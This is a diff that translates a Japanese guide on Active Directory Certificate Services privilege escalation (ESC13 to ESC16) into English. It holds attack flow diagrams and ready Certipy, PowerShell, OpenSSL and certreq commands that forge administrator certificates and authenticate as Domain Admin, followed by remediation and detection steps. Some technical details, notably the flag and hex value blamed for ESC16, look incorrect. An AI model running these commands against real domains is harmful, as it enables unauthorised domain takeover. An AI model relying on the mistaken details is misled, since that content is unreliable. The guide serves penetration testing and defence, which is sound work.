-    DC->>DC: グループメンバーシップ付与
-    Note over DC: 証明書ベースの<br/>グループメンバーシップ
-    
-    DC->>A: Domain Admins として TGT 発行
-    
-    Note over A: Domain Admin 権限取得
+
+    DC->>DC: Grant group membership
+    Note over DC: Certificate-based<br/>group membership
+
+    DC->>A: Issue TGT as Domain Admins
+
+    Note over A: Domain Admin privileges obtained
 ```
 
-### 攻撃コマンド
+### Attack Commands
 
-**1. Issuance Policy の確認**
+**1. Check Issuance Policy**
 
 ```powershell
-# AD で OID とグループのリンクを確認
+# Check OID-to-group links in AD
 Get-ADObject -Filter {objectClass -eq "msPKI-Enterprise-Oid"} -SearchBase "CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=corp,DC=local" -Properties *
 
-# msDS-OIDToGroupLink 属性を確認
+# Check msDS-OIDToGroupLink attribute
 ```
 
-**2. 脆弱性スキャン**
+**2. Vulnerability Scan**
 
 ```bash
-# Certipy で ESC13 を検出
+# Detect ESC13 with Certipy
 certipy find -u john@corp.local -p 'Password123!' -dc-ip 10.10.10.100 -vulnerable -stdout | grep -A 20 "ESC13"
 ```
 
-**3. 証明書要求**
+**3. Certificate Request**
 
 ```bash
-# Issuance Policy 付きテンプレートで証明書要求
+# Request certificate from Issuance Policy template
 certipy req -u john@corp.local -p 'Password123!' -dc-ip 10.10.10.100 -ca 'corp-DC01-CA' -template 'ESC13Template'
 
-# 出力: john.pfx (Issuance Policy 付き)
+# Output: john.pfx (with Issuance Policy)
 ```
 
-**4. 認証**
+**4. Authentication**
 
 ```bash
-# 証明書で認証
+# Authenticate with certificate
 certipy auth -pfx john.pfx -dc-ip 10.10.10.100
 
-# Issuance Policy により Domain Admins として認証される
+# Authenticated as Domain Admins via Issuance Policy
 ```
 
-**5. OID リンクの確認 (詳細)**
+**5. Check OID Link (detailed)**
 
 ```powershell
-# PowerShell で確認
+# Check with PowerShell
 $oid = Get-ADObject -Filter {cn -eq "1.2.3.4.5.6.7.8.9"} -SearchBase "CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=corp,DC=local" -Properties *
 
 $oid.'msDS-OIDToGroupLink'
-# 出力: CN=Domain Admins,CN=Users,DC=corp,DC=local
+# Output: CN=Domain Admins,CN=Users,DC=corp,DC=local
 ```
 
-**6. 防御策**
+**6. Defenses**
 
 ```powershell
-# 不要な OID リンクを削除
+# Remove unnecessary OID links
 Set-ADObject -Identity "CN=1.2.3.4.5.6.7.8.9,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=corp,DC=local" -Clear msDS-OIDToGroupLink
 
-# または Issuance Policy を無効化
+# Or disable Issuance Policy
 ```
 
 ---
 
 ## ESC14: Weak Explicit Certificate Mapping
 
-### 攻撃条件
+### Attack Conditions
 
-- ✅ **StrongCertificateBindingEnforcement** が **0** (無効) または **1** (部分的) に設定
-- ✅ 弱い証明書マッピングが許可されている
+- ✅ **StrongCertificateBindingEnforcement** is set to **0** (disabled) or **1** (partial)
+- ✅ Weak certificate mapping is permitted
 
-### 攻撃フロー
+### Attack Flow
 
 ```mermaid
 sequenceDiagram
     autonumber
-    participant A as 攻撃者
+    participant A as Attacker
     participant CA as Certificate Authority
     participant DC as Domain Controller
-    
-    Note over DC: 設定:<br/>StrongCertificateBindingEnforcement = 0 or 1<br/>(弱い証明書マッピング)
-    
-    A->>CA: 証明書要求
+
+    Note over DC: Setting:<br/>StrongCertificateBindingEnforcement = 0 or 1<br/>(weak certificate mapping)
+
+    A->>CA: Certificate request
     Note over A: SAN UPN:<br/>Administrator@corp.local
-    
-    CA->>A: 証明書発行
-    
-    Note over A: 認証フェーズ
-    
-    A->>DC: 証明書で認証<br/>(PKINIT)
-    
-    DC->>DC: 証明書マッピング処理
-    Note over DC: StrongCertificateBindingEnforcement<br/>= 0 または 1<br/>→ SID 検証が不十分
-    
-    DC->>DC: UPN のみで認証
+
+    CA->>A: Issue certificate
+
+    Note over A: Authentication phase
+
+    A->>DC: Authenticate with certificate<br/>(PKINIT)
+
+    DC->>DC: Process certificate mapping
+    Note over DC: StrongCertificateBindingEnforcement<br/>= 0 or 1<br/>→ Insufficient SID validation
+
+    DC->>DC: Authenticate by UPN only
     Note over DC: SAN UPN:<br/>Administrator@corp.local
-    
-    DC->>DC: SID 検証をスキップ
-    Note over DC: 弱いマッピング
-    
-    DC->>A: Administrator として認証成功
-    
-    A->>DC: TGT 要求
-    DC->>A: Administrator TGT 発行
-    
-    Note over A: Domain Admin 権限取得
+
+    DC->>DC: Skip SID validation
+    Note over DC: Weak mapping
+
+    DC->>A: Authentication successful as Administrator
+
+    A->>DC: TGT request
+    DC->>A: Issue Administrator TGT
+
+    Note over A: Domain Admin privileges obtained
 ```
 
-### 攻撃コマンド
+### Attack Commands
 
-**1. StrongCertificateBindingEnforcement の確認**
+**1. Check StrongCertificateBindingEnforcement**
 
 ```powershell
-# DC のレジストリを確認
+# Check DC registry
 Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\Kdc" -Name "StrongCertificateBindingEnforcement"
 
-# 値の意味:
-# 0 = 無効 (最も脆弱)
-# 1 = 互換モード (部分的)
-# 2 = 完全強制 (安全)
+# Value meanings:
+# 0 = Disabled (most vulnerable)
+# 1 = Compatibility mode (partial)
+# 2 = Full enforcement (secure)
 ```
 
-**2. 証明書取得 (他の ESC を使用)**
+**2. Obtain Certificate (using another ESC)**
 
 ```bash
-# ESC1 などで Administrator の証明書を取得
+# Obtain Administrator's certificate with ESC1 etc.
 certipy req -u john@corp.local -p 'Password123!' -dc-ip 10.10.10.100 -ca 'corp-DC01-CA' -template 'VulnerableTemplate' -upn 'administrator@corp.local'
 ```
 
-**3. 認証**
+**3. Authentication**
 
 ```bash
-# 弱いマッピングで認証
+# Authenticate with weak mapping
 certipy auth -pfx administrator.pfx -dc-ip 10.10.10.100
 
-# UPN のみでマッピングされ、SID 検証がスキップされる
+# Mapped by UPN only, SID validation is skipped
 ```
 
-**4. 修正方法 (防御側)**
+**4. Remediation (Defender)**
 
 ```powershell
-# 強い証明書バインディングを強制
+# Enforce strong certificate binding
 Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\Kdc" -Name "StrongCertificateBindingEnforcement" -Value 2
 
-# KDC サービス再起動
+# Restart KDC service
 Restart-Service kdc
 ```
 
-**5. Windows Update の適用**
+**5. Apply Windows Updates**
 
 ```powershell
-# KB5014754 以降の更新プログラムを適用
-# これにより StrongCertificateBindingEnforcement のデフォルトが強化される
+# Apply KB5014754 or later updates
+# This strengthens the default for StrongCertificateBindingEnforcement
 ```
 
 ---
 
 ## ESC15: Arbitrary Application Policy Injection in V1 Templates (CVE-2024-49019 "EKUwu")
 
-### 攻撃条件
+### Attack Conditions
 
-- ✅ 証明書テンプレートが **Schema Version 1** (古い形式)
-- ✅ テンプレートに **Application Policy** が定義されていない
-- ✅ 低特権ユーザーに **Enroll** 権限がある
+- ✅ The certificate template is **Schema Version 1** (legacy format)
+- ✅ No **Application Policy** is defined on the template
+- ✅ A low-privileged user has **Enroll** permission
 
-### 攻撃フロー
+### Attack Flow
 
 ```mermaid
 sequenceDiagram
     autonumber
-    participant A as 攻撃者
-    participant V1 as V1 証明書<br/>テンプレート
+    participant A as Attacker
+    participant V1 as V1 Certificate<br/>Template
     participant CA as Certificate Authority
     participant DC as Domain Controller
-    
+
     Note over V1: Schema Version 1<br/>(msPKI-Template-Schema-Version = 1)
-    Note over V1: Application Policy が未定義
-    
-    A->>V1: テンプレート確認
-    V1->>A: V1 テンプレート検出<br/>Application Policy なし
-    
-    Note over A: 証明書リクエストを作成
-    
-    A->>A: CSR に任意の<br/>Application Policy を追加
-    Note over A: 例:<br/>- Client Authentication (1.3.6.1.5.5.7.3.2)<br/>- Smart Card Logon (1.3.6.1.4.1.311.20.2.2)
-    
-    A->>CA: 証明書登録要求<br/>(Application Policy 付き CSR)
-    
-    CA->>CA: V1 テンプレートの検証
-    Note over CA: Application Policy の<br/>検証が不十分
-    
-    CA->>CA: CSR の Application Policy を<br/>そのまま受け入れ
-    
-    CA->>A: 任意の Application Policy 付き<br/>証明書発行
-    Note over CA: Client Authentication EKU<br/>Smart Card Logon EKU など
-    
-    Note over A: 認証フェーズ
-    
-    A->>DC: 証明書で認証<br/>(Client Authentication として使用)
-    
-    DC->>DC: EKU 確認:<br/>Client Authentication
-    Note over DC: 証明書が有効な EKU を持つ
-    
-    DC->>A: TGT 発行
-    
-    Note over A: 認証成功<br/>(本来許可されていない用途で使用)
+    Note over V1: Application Policy is undefined
+
+    A->>V1: Inspect template
+    V1->>A: V1 template detected<br/>No Application Policy
+
+    Note over A: Build certificate request
+
+    A->>A: Add arbitrary<br/>Application Policy to CSR
+    Note over A: Examples:<br/>- Client Authentication (1.3.6.1.5.5.7.3.2)<br/>- Smart Card Logon (1.3.6.1.4.1.311.20.2.2)
+
+    A->>CA: Certificate enrollment request<br/>(CSR with Application Policy)
+
+    CA->>CA: Validate V1 template
+    Note over CA: Application Policy<br/>validation is insufficient
+
+    CA->>CA: Accept Application Policy<br/>from CSR as-is
+
+    CA->>A: Issue certificate with arbitrary Application Policy
+    Note over CA: Client Authentication EKU<br/>Smart Card Logon EKU, etc.
+
+    Note over A: Authentication phase
+
+    A->>DC: Authenticate with certificate<br/>(use as Client Authentication)
+
+    DC->>DC: Check EKU:<br/>Client Authentication
+    Note over DC: Certificate has valid EKU
+
+    DC->>A: Issue TGT
+
+    Note over A: Authentication successful<br/>(used for a purpose not originally permitted)
 ```
 
-### 攻撃コマンド
+### Attack Commands
 
-**1. V1 テンプレートの検出**
+**1. Detect V1 Templates**
 
 ```powershell
-# PowerShell で V1 テンプレートを検索
+# Search for V1 templates with PowerShell
 Get-ADObject -Filter {objectClass -eq "pKICertificateTemplate"} -SearchBase "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=corp,DC=local" -Properties msPKI-Template-Schema-Version | Where-Object {$_.'msPKI-Template-Schema-Version' -eq 1}
 ```
 
 ```bash
-# Certipy で V1 テンプレートを検出
+# Detect V1 templates with Certipy
 certipy find -u john@corp.local -p 'Password123!' -dc-ip 10.10.10.100 -vulnerable -stdout | grep -B 5 "Schema Version.*: 1"
 ```
 
-**2. Application Policy 注入 (OpenSSL)**
+**2. Application Policy Injection (OpenSSL)**
 
 ```bash
-# OpenSSL で CSR を作成し、Application Policy を追加
+# Create CSR with OpenSSL and add Application Policy
 
-# openssl.cnf に追加:
+# Add to openssl.cnf:
 cat >> openssl.cnf << EOF
 [v3_req]
 extendedKeyUsage = clientAuth, smartcardLogon
 EOF
 
-# CSR 作成
+# Create CSR
 openssl req -new -key user.key -out user.csr -config openssl.cnf -extensions v3_req -subj "/CN=john"
 
-# CSR を Base64 エンコード
+# Base64 encode the CSR
 cat user.csr | base64 -w 0
 ```
 
-**3. Certipy での攻撃 (直接サポートされている場合)**
+**3. Attack with Certipy (when directly supported)**
 
 ```bash
-# Certipy で V1 テンプレートに任意の EKU を注入
+# Inject arbitrary EKU into V1 template with Certipy
 certipy req -u john@corp.local -p 'Password123!' -dc-ip 10.10.10.100 -ca 'corp-DC01-CA' -template 'V1Template' -key-usage 'clientAuth,smartcardLogon'
 
-# または
+# Or
 certipy req -u john@corp.local -p 'Password123!' -dc-ip 10.10.10.100 -ca 'corp-DC01-CA' -template 'V1Template' -upn 'administrator@corp.local' -key-usage 'clientAuth'
 ```
 
-**4. 手動での CSR 提出 (Windows)**
+**4. Manual CSR Submission (Windows)**
 
 ```powershell
-# certreq で CSR を提出
+# Submit CSR with certreq
 certreq -submit -config "DC01\corp-DC01-CA" -attrib "CertificateTemplate:V1Template" user.csr
 
-# 証明書を取得
+# Retrieve certificate
 certreq -retrieve [RequestId] user.cer
 ```
 
-**5. 認証**
+**5. Authentication**
 
 ```bash
-# 取得した証明書で認証
+# Authenticate with the obtained certificate
 certipy auth -pfx user.pfx -dc-ip 10.10.10.100
 ```
 
-**6. 防御策**
+**6. Defenses**
 
 ```powershell
-# V1 テンプレートを V2/V3/V4 にアップグレード
-# または V1 テンプレートを無効化
+# Upgrade V1 templates to V2/V3/V4
+# Or disable V1 templates
 
-# テンプレートのスキーマバージョンを確認
+# Check template schema version
 Get-ADObject -Filter {cn -eq "V1Template"} -SearchBase "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=corp,DC=local" -Properties msPKI-Template-Schema-Version
 
-# V1 テンプレートを無効化
+# Disable V1 template
 Set-ADObject -Identity "CN=V1Template,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=corp,DC=local" -Replace @{flags=131072}
 ```
 
@@ -1573,112 +1574,112 @@ Set-ADObject -Identity "CN=V1Template,CN=Certificate Templates,CN=Public Key Ser
 
 ## ESC16: Security Extension Disabled on CA (Globally)
 
-### 攻撃条件
+### Attack Conditions
 
-- ✅ CA で **EDITF_ATTRIBUTEENDDATE** フラグが設定されている
-- ✅ これにより **すべての証明書** で Security Extension が無効化される
-- ✅ 弱い証明書マッピングが有効
+- ✅ The CA has the **EDITF_ATTRIBUTEENDDATE** flag set
+- ✅ This disables the Security Extension on **all certificates**
+- ✅ Weak certificate mapping is enabled
 
-### 攻撃フロー
+### Attack Flow
 
 ```mermaid
 sequenceDiagram
     autonumber
-    participant A as 攻撃者
+    participant A as Attacker
     participant CA as Certificate Authority
-    participant T as 任意のテンプレート
+    participant T as Any Template
     participant DC as Domain Controller
-    
-    Note over CA: CA レジストリ設定:<br/>EditFlags に<br/>EDITF_ATTRIBUTEENDDATE が含まれる
-    
-    Note over CA: この設定により<br/>すべての証明書で<br/>Security Extension が無効化
-    
-    A->>T: 任意のテンプレートで証明書要求
+
+    Note over CA: CA registry setting:<br/>EditFlags includes<br/>EDITF_ATTRIBUTEENDDATE
+
+    Note over CA: This setting disables<br/>Security Extension on<br/>all certificates
+
+    A->>T: Request certificate from any template
     Note over A: SAN UPN:<br/>Administrator@corp.local
-    
-    T->>CA: 証明書リクエスト
-    
-    CA->>CA: EDITF_ATTRIBUTEENDDATE 確認
-    Note over CA: フラグが有効<br/>→ Security Extension を生成しない
-    
-    CA->>A: 証明書発行<br/>(Security Extension なし)
-    
-    Note over A: すべての証明書で<br/>SID 検証がスキップされる
-    
-    A->>DC: 証明書で認証
-    
-    DC->>DC: Security Extension 確認
-    Note over DC: Security Extension がない<br/>→ SID 検証をスキップ
-    
-    DC->>DC: UPN のみで認証
-    Note over DC: 弱い証明書マッピング
-    
-    DC->>A: Administrator として認証成功
-    
-    A->>DC: TGT 要求
-    DC->>A: Administrator TGT 発行
-    
-    Note over A: Domain Admin 権限取得
+
+    T->>CA: Certificate request
+
+    CA->>CA: Check EDITF_ATTRIBUTEENDDATE
+    Note over CA: Flag is enabled<br/>→ Do not generate Security Extension
+
+    CA->>A: Issue certificate<br/>(without Security Extension)
+
+    Note over A: SID validation is skipped<br/>for all certificates
+
+    A->>DC: Authenticate with certificate
+
+    DC->>DC: Check Security Extension
+    Note over DC: No Security Extension<br/>→ Skip SID validation
+
+    DC->>DC: Authenticate by UPN only
+    Note over DC: Weak certificate mapping
+
+    DC->>A: Authentication successful as Administrator
+
+    A->>DC: TGT request
+    DC->>A: Issue Administrator TGT
+
+    Note over A: Domain Admin privileges obtained
 ```
 
-### 攻撃コマンド
+### Attack Commands
 
-**1. CA 設定の確認**
+**1. Check CA Settings**
 
 ```powershell
-# Windows: CA の EditFlags を確認
+# Windows: Check CA EditFlags
 certutil -config "DC01\corp-DC01-CA" -getreg policy\EditFlags
 
-# 出力に EDITF_ATTRIBUTEENDDATE が含まれるか確認
+# Check if output contains EDITF_ATTRIBUTEENDDATE
 ```
 
 ```bash
-# Linux: Certipy で確認
+# Linux: Check with Certipy
 certipy find -u john@corp.local -p 'Password123!' -dc-ip 10.10.10.100 -vulnerable -stdout | grep -i "EDITF_ATTRIBUTEENDDATE"
 ```
 
-**2. 証明書要求**
+**2. Certificate Request**
 
 ```bash
-# 任意のテンプレートで Administrator の証明書を要求
+# Request Administrator's certificate from any template
 certipy req -u john@corp.local -p 'Password123!' -dc-ip 10.10.10.100 -ca 'corp-DC01-CA' -template 'User' -upn 'administrator@corp.local'
 
-# Security Extension なしで証明書が発行される
+# Certificate is issued without Security Extension
 ```
 
-**3. 認証**
+**3. Authentication**
 
 ```bash
-# 弱いマッピングで認証
+# Authenticate with weak mapping
 certipy auth -pfx administrator.pfx -dc-ip 10.10.10.100
 
-# UPN のみでマッピングされる
+# Mapped by UPN only
 ```
 
-**4. CA 設定の確認 (レジストリ直接)**
+**4. Check CA Settings (via registry directly)**
 
 ```powershell
-# CA サーバーのレジストリを確認
+# Check registry on the CA server
 Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\corp-DC01-CA\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy" -Name "EditFlags"
 
-# EditFlags の値を確認
+# Check EditFlags value
 # EDITF_ATTRIBUTEENDDATE = 0x00004000
 ```
 
-**5. 修正方法 (防御側)**
+**5. Remediation (Defender)**
 
 ```powershell
-# EDITF_ATTRIBUTEENDDATE を無効化
+# Disable EDITF_ATTRIBUTEENDDATE
 certutil -config "DC01\corp-DC01-CA" -setreg policy\EditFlags -EDITF_ATTRIBUTEENDDATE
 
-# CA サービス再起動
+# Restart CA service
 Restart-Service certsvc
 ```
 
-**6. レジストリで直接修正**
+**6. Fix via Registry Directly**
 
 ```powershell
-# EditFlags から 0x00004000 を削除
+# Remove 0x00004000 from EditFlags
 $path = "HKLM:\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\corp-DC01-CA\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy"
 $currentFlags = (Get-ItemProperty -Path $path -Name "EditFlags").EditFlags
 $newFlags = $currentFlags -band (-bnot 0x00004000)
@@ -1689,80 +1690,80 @@ Restart-Service certsvc
 
 ---
 
-## まとめ: ESC 攻撃の検出と防御
+## Summary: Detection and Defense Against ESC Attacks
 
-### 一般的な検出方法
+### General Detection Methods
 
 ```mermaid
 sequenceDiagram
-    participant A as セキュリティ監査者
+    participant A as Security Auditor
     participant Tools as Certify / Certipy
     participant AD as Active Directory
     participant CA as Certificate Authority
-    participant Logs as イベントログ
-    
-    Note over A: フェーズ 1: 脆弱性スキャン
-    
-    A->>Tools: certify find /vulnerable<br/>または<br/>certipy find -vulnerable
-    
-    Tools->>AD: AD CS 設定を列挙
-    Tools->>CA: CA 設定を確認
-    
-    AD->>Tools: テンプレート情報
-    CA->>Tools: CA 設定情報
-    
-    Tools->>A: 脆弱性レポート<br/>(ESC1-16)
-    
-    Note over A: フェーズ 2: ログ監視
-    
-    A->>Logs: イベントログ確認
-    Note over A: Event ID:<br/>- 4886: 証明書要求受信<br/>- 4887: 証明書発行<br/>- 4888: 証明書要求拒否
-    
-    Logs->>A: 異常な証明書要求を検出
-    
-    Note over A: フェーズ 3: BloodHound 分析
-    
+    participant Logs as Event Logs
+
+    Note over A: Phase 1: Vulnerability scan
+
+    A->>Tools: certify find /vulnerable<br/>or<br/>certipy find -vulnerable
+
+    Tools->>AD: Enumerate AD CS configuration
+    Tools->>CA: Check CA configuration
+
+    AD->>Tools: Template information
+    CA->>Tools: CA configuration information
+
+    Tools->>A: Vulnerability report<br/>(ESC1-16)
+
+    Note over A: Phase 2: Log monitoring
+
+    A->>Logs: Review event logs
+    Note over A: Event IDs:<br/>- 4886: Certificate request received<br/>- 4887: Certificate issued<br/>- 4888: Certificate request denied
+
+    Logs->>A: Detect anomalous certificate requests
+
+    Note over A: Phase 3: BloodHound analysis
+
     A->>Tools: certipy find -bloodhound
-    Tools->>A: BloodHound JSON データ
-    
-    A->>A: BloodHound で<br/>攻撃パスを可視化
+    Tools->>A: BloodHound JSON data
+
+    A->>A: Visualize attack paths<br/>in BloodHound
 ```
 
-### 防御策の実装
+### Implementing Defenses
 
-**1. テンプレート設定の強化**
+**1. Harden Template Settings**
 
 ```powershell
-# CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT を無効化
+# Disable CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT
 Set-ADObject -Identity "CN=Template,CN=Certificate Templates,..." -Replace @{'msPKI-Certificate-Name-Flag'=0}
 
-# 不要な EKU を削除
+# Remove unnecessary EKUs
 Set-ADObject -Identity "CN=Template,CN=Certificate Templates,..." -Clear pKIExtendedKeyUsage
 ```
 
-**2. CA 設定の強化**
+**2. Harden CA Settings**
 
 ```powershell
-# EDITF_ATTRIBUTESUBJECTALTNAME2 を無効化
+# Disable EDITF_ATTRIBUTESUBJECTALTNAME2
 certutil -config "DC01\corp-DC01-CA" -setreg policy\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2
 
-# 強い証明書バインディングを強制
+# Enforce strong certificate binding
 Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\Kdc" -Name "StrongCertificateBindingEnforcement" -Value 2
 ```
 
-**3. Web Enrollment の保護**
+**3. Protect Web Enrollment**
 
 ```powershell
-# HTTPS のみを強制
-# HTTP を無効化
+# Enforce HTTPS only
+# Disable HTTP
 ```
 
-**4. 定期的な監査**
+**4. Regular Auditing**
 
 ```powershell
-# 週次で脆弱性スキャン
+# Weekly vulnerability scan
 .\Certify.exe find /vulnerable
 
-# 月次で権限監査
+# Monthly permission audit
 Get-DomainObjectAcl -Identity "CN=Certificate Templates,..." | Export-Csv audit.csv
 ```
